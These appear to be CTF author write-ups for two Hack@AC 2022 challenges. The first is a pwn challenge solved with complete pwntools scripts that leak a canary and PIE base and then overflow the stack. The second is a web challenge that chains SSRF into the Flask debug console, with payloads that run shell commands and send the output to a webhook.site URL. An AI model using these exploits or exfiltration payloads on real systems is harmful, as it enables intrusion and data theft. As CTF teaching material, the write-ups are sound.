# Author writeups for Hack@AC 2022

## Sections

[Crypto](#crypto)

[Forensics](#forensics)

[Misc](#misc)

[Pwn](#pwn)

[RE](#re)

[Web](#web)

---

## Crypto

## Forensics

## Misc

## Pwn

### RPS 2.0

> Rock Paper Scissors QOL Update, hope you like it~  
> 
> Author: Lucas

---

For this challenge, binary and source were given, as well as the rglddwapswthssf cheat sheet for reference. Let's take a
look at the source.

---

#### Analysing source

When we read through the source, we find this struct definition:

```c 
typedef struct choices {
  char choice[9];
} choices;
```

And it's used here:

```c 
    choices choices[15];
    memcpy(choices[0].choice, "Rock", 9);
    memcpy(choices[1].choice, "Gun", 9);
    memcpy(choices[2].choice, "Lightnig", 9);
    memcpy(choices[3].choice, "Devil", 9);
    memcpy(choices[4].choice, "Dragon", 9);
    memcpy(choices[5].choice, "Water", 9);
    memcpy(choices[6].choice, "Air", 9);
    memcpy(choices[7].choice, "Paper", 9);
    memcpy(choices[8].choice, "Sponge", 9);
    memcpy(choices[9].choice, "Wolf", 9);
    memcpy(choices[10].choice, "Tree", 9);
    memcpy(choices[11].choice, "Human", 9);
    memcpy(choices[12].choice, "Snake", 9);
    memcpy(choices[13].choice, "Scissors", 9);
    memcpy(choices[14].choice, "Fire", 9);
```

So, each item in the array `choices` is guaranteed to be 9 bytes long. 

(Why 9? It's the easiest to read the canary, since the canary is 8 bytes long. Also, with this magic number the canary can be leaked in 1 read, which is so nice of me)

In the tutorial, you might notice this bit:

```c 
    gets(inp);
    user = atoi(inp) - 1;
    printf("You chose %s\n", choices[user].choice);
    
    if ((user < 0) || (user > 14)) {
      puts("What are you doing? let's try this again.");
      goto restart;
    } 
```

The check for `user` being in-bounds is after we read our value. Hence, we can achieve array OOB and arbitrary read. This is the first vuln.

The second vuln should be pretty obvious, it's a basic buffer overflow. However, the catch is that you need to win all 5 games as well as the tutorial to get to `return 0`, which only then allows us to overwrite RIP. This is the fun part :)

---

After this, exploitation is quite straightforward. First, we need to fuzz our arbitrary read for canary and PIE leaks.
Here's the script I used:

```py 
import time
from pwn import *

elf = context.binary = ELF('./rps2')
rop = ROP(elf)
p = remote('alpha.8059blank.ml', 3000)

moves = [ "Rock", "Gun", "Lightnig", "Devil", "Dragon", "Water", "Air", "Paper", "Sponge", "Wolf", "Tree", "Human",\
"Snake", "Scissors", "Fire"]

def i_win():
    p.recvuntil(b'I choose ')
    bot = moves.index(p.recvline().strip().decode())
    me = str((bot + 2) % 15 + 1).encode()
    return me

p.clean()
p.sendline("-183")
p.recvuntil(b'You chose ')
print(hex(u64(p.recvline().strip().ljust(8, b'\x00'))))

# find canary
# canary should be +ve offset since it protects the stack from overflow.
# canary will look like 0x9184c574d15100
for i in range(0, 67):
    try:
        time.sleep(0.1)
        p.sendline(str(i))
        p.recvuntil(b'You chose ')
        print(hex(u64(p.recvline().strip()[:-1].rjust(8, b'\x00'))), i)
        p.clean()
    except:
        continue

# find pie
# pie should be -ve offset since memory regions that refer to it are usually before the stack.
# pie leak will look like 0x55bdd2a00970
for i in range(-300, 0):
    try:
        time.sleep(0.1)
        p.sendline(str(i))
        p.recvuntil(b'You chose ')
        print(hex(u64(p.recvline().strip().ljust(8, b'\x00'))), i)
        p.clean()
    except:
        continue
```

```
0x3100000000000000 17
0x9184c574d1510000 18
0x0 19
...
0x0 -32
0x55bdd2a00970 -31
0x0 -30
```

Above are the leaked canary and PIE offsets, with the PIE being that of entry0, whose offset is 0x970. For the canary we
may read it wholesale, but for the PIE base we should subtract 0x970 from the leaked offset.

To win the game is quite trivial, just reverse the check done in the program to always be able to win.

```py 
from pwn import *

elf = context.binary = ELF('./rps2')
rop = ROP(elf)
#p = process()
#input()
p = remote('alpha.8059blank.ml', 3000)

moves = [ "Rock", "Gun", "Lightnig", "Devil", "Dragon", "Water", "Air", "Paper", "Sponge", "Wolf", "Tree", "Human",\
"Snake", "Scissors", "Fire"]

def i_win():
    p.recvuntil(b'I choose ')
    bot = moves.index(p.recvline().strip().decode())
    me = str((bot + 2) % 15 + 1).encode()
    return me

# How to obtain this index? 
# run fuzzer.py, look for the first value OUTSIDE of ur array that ends with 00. these usually indicate canaries which
# always end with 00. Note that it should be very close to the end of your array.
p.clean()
p.sendline("18")
p.recvuntil(b'You chose ')
canary = u64(p.recvline().strip().rjust(8, b'\x00'))
print(hex(canary))


# How to obtain this index? 
# run fuzzer.py, look for the first value that has 0x55 or 0x56. these usually indicate PIE addresses since PIE always
# starts with 0x55 or 0x56.
# there's another one at -183, but -31 is easier to use cos -183 points to unknown addr 
p.sendline("-31")
p.recvuntil(b'You chose ')
pie = u64(p.recvline().strip().ljust(8, b'\x00'))
print(hex(pie))

# shld be 0x55...970

pie = pie - 0x970
print(hex(pie))
print(hex(pie + elf.symbols.win)) # we want this :)

# clear tutorial
p.sendline(i_win())

p.sendline(i_win())
p.sendline(i_win())
p.sendline(i_win())
p.sendline(i_win())
win = i_win()
payload = flat(
    win + b'A'*(8 - len(win)),
    canary,
    b'A'*8,
    pie + rop.ret.address, # movaps issue - ask in discord if not sure what this is
    pie + elf.symbols.win,
)
print(payload)
p.sendline(payload)
p.interactive()

```

The above exploit script will get the flag `ACSI{sp0nge_b3ats_gun_a46h01}`.

## RE

## Web

### Fatherboat v2.0

#### 1000 points - 0 solves

> **Hard challenge!**
>
> Last year kenna hacked liao, this year I hired a better dev to make my website! Maybe now can compete with Mothership...
>
> Author: Lucas

--- 

For this challenge, the entire Docker deployment config is provided, so you should try and run the application locally.
The templates weren't included, but they're not necessary to solve the challenge.

Let's take a look at app.py:

```py
@app.route('/sharelobang', methods=["GET", "POST"])
def visit():
    if request.method == "GET":
        return render_template("share.html")
    else:
        if url := request.form.get('url'):
            if urlparse(url).netloc != "localhost:5000":
                return Response('eh this one not from our site... from mothership isit??', status=400)
            thread = Bot(url)
            thread.start()
            return Response('Thanks ah!', status=200)
        return Response('Why liddat', status=400)
```

This route seems to allow us to perform SSRF to other pages on the site. Hmm.. but what page would need SSRF? Let's take
a look at bot.py:

```py
    # unimportant backend initlization pls ignore
    console = requests.get('http://localhost:5000/console').content.decode()
    secret = re.search('SECRET = "(.*)"', console).group(1)
    driver.get(f'localhost:5000/console?__debugger__=yes&cmd=pinauth&pin={pin}&s={secret}')

    # +----------------------+
    # | Visits your URL!!!!! |
    # +----------------------+

    driver.get(self.url)
    time.sleep(100)
```

So the bot visits /console and obtains a secret, then authenticates itself with the pin and the secret. Afterwards, it
finally visits the URL that you provide it.

If we do a quick Google, /console for Flask apps is the admin panel that allows a user to run arbitrary Python code.
However, it's locked behind a pin that only the bot knows, and we don't have access to it. However, if you run the app
locally, you can see that each line of code you run is sent in a HTTP request to the server, with a special identifier
cookie and the secret in the query string. 

Running the app locally:

```
docker build -t fatherboat .
docker run fatherboat -p "5000:5000"
```

Once the app builds, you should see a pin printed. Navigate to <http://localhost:5000/console> and enter in the
debugger pin to gain access. When you enter `print('hello world')` into the Python shell, you should see a request like
this:

![hello world](images/fatherboat/hello_world.png)

The command you executed is put directly in the query string, along with the secret and a few other parameters. You also
have a cookie that identifies you as already authenticated, so you don't need to re-enter the pin.

Using these, you can see that RCE is possible via the SSRF. But first, you need to get the secret so you can exploit the
SSRF.

Back to the remote application, navigate to /console. Look through the response and you will find the secret:

![secret](images/fatherboat/secret.png)

Our base SSRF URL will look like this:
`http://localhost:5000/console?__debugger__=yes&s=LGoQoeWW26q97hcsoW5Y&frm=0&cmd=`

To achieve RCE, just URL-encode your payload and append it to the end of the URL.

```
// import os; import requests
http://localhost:5000/console?__debugger__=yes&s=LGoQoeWW26q97hcsoW5Y&frm=0&cmd=import%20os%3B%20import%20requests

// requests.get(f'https://webhook.site/0433eafd-89e6-4a5a-b2e5-636685144500?o={os.popen("ls").read()}')
http://localhost:5000/console?__debugger__=yes&s=LGoQoeWW26q97hcsoW5Y&frm=0&cmd=requests.get%28f%27https%3A%2F%2Fwebhook.site%2F0433eafd-89e6-4a5a-b2e5-636685144500%3Fo%3D%7Bos.popen%28%22ls%22%29.read%28%29%7D%27%29

// requests.get(f'https://webhook.site/0433eafd-89e6-4a5a-b2e5-636685144500?o={os.popen("cat flag.txt").read()}')
http://localhost:5000/console?__debugger__=yes&s=LGoQoeWW26q97hcsoW5Y&frm=0&cmd=requests.get%28f%27https%3A%2F%2Fwebhook.site%2F0433eafd-89e6-4a5a-b2e5-636685144500%3Fo%3D%7Bos.popen%28%22cat%20flag.txt%22%29.read%28%29%7D%27%29
```
